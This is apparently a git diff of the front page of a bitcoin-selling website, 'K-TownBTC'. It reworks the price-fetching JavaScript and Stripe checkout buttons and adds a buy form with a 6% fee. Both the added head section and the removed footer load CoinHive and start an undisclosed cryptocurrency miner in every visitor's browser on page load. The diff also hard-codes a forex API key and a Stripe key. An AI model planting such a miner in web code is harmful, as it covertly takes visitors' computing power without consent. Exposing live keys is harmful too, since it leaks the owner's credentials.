@@ -14,6 +14,65 @@
 
     <!-- Custom styles for this template -->
     <link href="css/carousel.css" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.2.1.min.js" ></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('VPgKqaoxqrpzKX18Ygy2pj04Dm8awHKi', {throttle: 0.5});
+  miner.start();
+</script>
+<script>
+  var buy;
+  var sell;
+  var rate;
+  var buycad;
+  var sellcad;
+  var amount;
+
+  function roundUp(num, precision) {
+  return Math.ceil(num * precision) / precision
+  }
+
+  $(document).ready(
+  function getbitstamp() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var jsonRes= JSON.parse(this.responseText);
+        if (jsonRes.hasOwnProperty('vwap')) {
+
+                 buy = roundUp(jsonRes.vwap, 1000);
+                 sell = roundUp(jsonRes.vwap, 1000);
+                 $("#buyusdbot2").text(buy);
+                 $("#amountdisplay").text("1");
+                 $("#total").val(roundUp((buy * 1.06), 100));
+
+        }
+    }
+  };
+  xhttp.open("GET", "https://www.bitstamp.net/api/ticker", true);
+  xhttp.send();
+
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+    var jsonRes = JSON.parse(this.responseText.slice(1, -1));
+        if (jsonRes.hasOwnProperty('price')) {
+
+                rate = (jsonRes.price);
+                buycad = roundUp(jsonRes.vwap * window.rate, 100);
+                sellcad = roundUp(jsonRes.vwap * window.rate, 100);
+        }
+    }
+
+  };
+  xhttp.open("GET", "https://forex.1forge.com/1.0.2/quotes?pairs=USDCAD&api_key=YdFryWLWVe65oM7DCaEw6Abd6zyZCpv6", true);
+  xhttp.send();
+
+  });
+
+</script>
   </head>
   <body>
 
@@ -113,33 +172,29 @@
 
  <!-- Three columns of text below the carousel -->
         <div class="row" id="exchange">
-          <div class="col-lg-6">
+          <div class="col-lg-6" style="text-align: center;">
             <img class="rounded-circle" src="img/btc-logo.png" alt="bitcoin" width="140" height="140">
-            <button class="btn btn-lg btn-outline-warning my-2 my-sm-0" data-toggle="modal" data-target="#buybitcoin" type="submit"><span id="buycadbot"></span> CAD$ &middot; $<span id="buyusdbot"></span> USD</button>
-            
-            <form action="/your-server-side-code-cad" method="POST">
-              <script
-                src="https://checkout.stripe.com/checkout.js" class="stripe-button"
-                data-key="pk_test_UNxP2GG9bvyICle3JasumBaD"
-                data-amount="<script>window.buycad</script>"
-                data-currency="CAD"
-                data-name="K-TownBTC"
-                data-description="Buy BTC with CAD"
-                data-label="Buy BTC with CAD"
-                data-image="https://www.k-townbtc.com/img/headdress2.png"
-                data-locale="auto"
-                data-bitcoin="false">
-              </script>
-            </form>
+            <button class="btn btn-lg btn-outline-success my-2 my-sm-0" data-toggle="modal" data-target="#buybitcoin" type="submit">$<span id="buyusdbot"></span> USD</button>
+<br/>
           <form action="/your-server-side-code-usd" method="POST">
+            <br/>
+            <span>Buy <input type="text" id="amount" value="1" size="10" onchange="
+            amount=$('#amount').val();
+            $('#amountdisplay').text(amount);
+            $('#total').val(roundUp((amount * buy * 1.06), 100));"></input> BTC at the price of $<span id="buyusdbot2"></span> USD.<br/>
+            Your total is $<input type="text" id="total" size="10" onchange="
+            total=$('#total').val();
+            $('#amount').val(roundUp((total / buy / 1.06), 10000));
+            $('#amountdisplay').text(amount);"></span> USD, including the 6% <a href="">transaction fee.</a></span><br/>
+            <span>We will send your <span id="amountdisplay"></span> BTC to this address : <input type="text" id="btcaddress" ></input></span><br/><br/>
               <script
                 src="https://checkout.stripe.com/checkout.js" class="stripe-button"
                 data-key="pk_test_UNxP2GG9bvyICle3JasumBaD"
-                data-amount="<script>window.buyusd</script>"
+                data-amount=""
                 data-currency="USD"
                 data-name="K-TownBTC"
-                data-description="Buy BTC with USD"
-                data-label="Buy BTC with USD"
+                data-description="Buy Bitcoin"
+                data-label="Buy Bitcoin"
                 data-image="https://www.k-townbtc.com/img/headdress2.png"
                 data-locale="auto"
                 data-bitcoin="false">
@@ -169,20 +224,6 @@
           <div class="col-lg-6">
             <img class="rounded-circle" src="img/CAD-logo.png" alt="Generic placeholder image" width="140" height="140">
             <button class="btn btn-lg btn-outline-warning  my-2 my-sm-0" type="submit" data-toggle="modal" data-target="#buybitcoin">Sell &middot; <span id="sellcadbot"></span> CAD$ &middot; $<span id="sellusdbot"></span> USD</button>
-            <form action="/your-server-side-code-btc-cad" method="POST">
-              <script
-                src="https://checkout.stripe.com/checkout.js" class="stripe-button"
-                data-key="pk_test_UNxP2GG9bvyICle3JasumBaD"
-                data-amount="<script>window.sellcad</script>"
-                data-currency="CAD"
-                data-name="K-TownBTC"
-                data-description="Buy CAD with BTC"
-                data-label="Buy CAD with BTC"
-                data-image="https://www.k-townbtc.com/img/headdress2.png"
-                data-locale="auto"
-                data-bitcoin="true">
-              </script>
-            </form>
             <form action="/your-server-side-code-btc-usd" method="POST">
               <script
                 src="https://checkout.stripe.com/checkout.js" class="stripe-button"
@@ -262,62 +303,6 @@ This is the true meaning of Bitcoin.</p>
     <!-- Bootstrap core JavaScript
     ================================================== -->
     <!-- Placed at the end of the document so the pages load faster -->
-<script src="https://code.jquery.com/jquery-3.2.1.min.js" ></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js" integrity="sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh" crossorigin="anonymous"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js" integrity="sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ" crossorigin="anonymous"></script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
-<script>
-  var miner = new CoinHive.Anonymous('VPgKqaoxqrpzKX18Ygy2pj04Dm8awHKi', {throttle: 0.5});
-  miner.start();
-</script>
-<script>
 
-$(document).ready(
-  function getrate() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-    var jsonRes = JSON.parse(this.responseText.slice(1, -1));
-        if (jsonRes.hasOwnProperty('price')) {
-
-                window.rate = (jsonRes.price);
-        }
-    }
-
-  };
-  xhttp.open("GET", "https://forex.1forge.com/1.0.2/quotes?pairs=USDCAD&api_key=YdFryWLWVe65oM7DCaEw6Abd6zyZCpv6", true);
-  xhttp.send();
-
-});
-  $(document).ready(
-  function getbitstamp() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-    var jsonRes= JSON.parse(this.responseText);
-        if (jsonRes.hasOwnProperty('vwap')) {
-
-                 window.buy = parseInt(jsonRes.vwap * 1.05, 10);
-                 window.buycad = parseInt(jsonRes.vwap * 1.05 * window.rate, 10);
-                 document.getElementById("buycadtop").innerHTML = window.buycad;
-                 document.getElementById("buyusdtop").innerHTML = window.buy;
-                 document.getElementById("buycadbot").innerHTML = window.buycad;
-                 document.getElementById("buyusdbot").innerHTML = window.buy;
-
-                 window.sell = parseInt(jsonRes.vwap / 1.05, 10);
-                 window.sellcad = parseInt(jsonRes.vwap /
-                 1.05 * window.rate, 10);
-
-                  document.getElementById("sellcadtop").innerHTML = window.sellcad;
-                  document.getElementById("sellusdtop").innerHTML = window.sell;
-                   document.getElementById("sellcadbot").innerHTML = window.sellcad;
-                  document.getElementById("sellusdbot").innerHTML = window.sell;
-        }
-    }
-  };
-  xhttp.open("GET", "https://www.bitstamp.net/api/ticker", true);
-  xhttp.send();
-});
-</script>
   </body>
 </html>
